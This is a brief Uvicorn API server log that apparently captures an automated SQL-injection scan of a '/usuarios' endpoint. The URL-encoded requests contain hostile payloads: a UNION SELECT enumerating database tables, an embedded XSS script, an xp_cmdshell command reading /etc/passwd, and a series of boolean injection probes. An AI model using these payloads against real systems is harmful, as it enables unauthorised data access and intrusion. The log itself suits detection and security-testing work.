api-1  | INFO:     Started server process [1]
api-1  | INFO:     Waiting for application startup.
api-1  | INFO:     Application startup complete.
api-1  | INFO:     Uvicorn running on http://0.0.0.0:8000 (Press CTRL+C to quit)
api-1  | INFO:     172.18.0.1:38406 - "GET /usuarios HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:38418 - "GET /usuarios?BdKi=2001%20AND%201%3D1%20UNION%20ALL%20SELECT%201%2CNULL%2C%27%3Cscript%3Ealert%28%22XSS%22%29%3C%2Fscript%3E%27%2Ctable_name%20FROM%20information_schema.tables%20WHERE%202%3E1--%2F%2A%2A%2F%3B%20EXEC%20xp_cmdshell%28%27cat%20..%2F..%2F..%2Fetc%2Fpasswd%27%29%23 HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:38428 - "GET /usuarios HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:38434 - "GET /6477 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:38436 - "GET /usuarios%28.%2C.%28%28%27%22%2C%2C HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:38444 - "GET /usuarios%27CKFird%3C%27%22%3ErzEbOq HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:38456 - "GET /usuarios HTTP/1.1" 200 OK
api-1  | INFO:     172.18.0.1:38442 - "GET /usuarios%29/%2A%2A/AND/%2A%2A/9874%3D4611/%2A%2A/AND/%2A%2A/%284755%3D4755 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:38458 - "GET /usuarios%29/%2A%2A/AND/%2A%2A/5132%3D5132/%2A%2A/AND/%2A%2A/%286332%3D6332 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:38460 - "GET /usuarios/%2A%2A/AND/%2A%2A/7205%3D9613 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:38472 - "GET /usuarios/%2A%2A/AND/%2A%2A/5132%3D5132 HTTP/1.1" 404 Not Found
api-1  | INFO:     172.18.0.1:38478 - "GET /usuarios%27%29/%2A%2A/AND/%2A%2A/7349%3D8286/%2A%2A/AND/%2A%2A/%28%27puig%27%3D%27puig HTTP/1.1" 404 Not Found
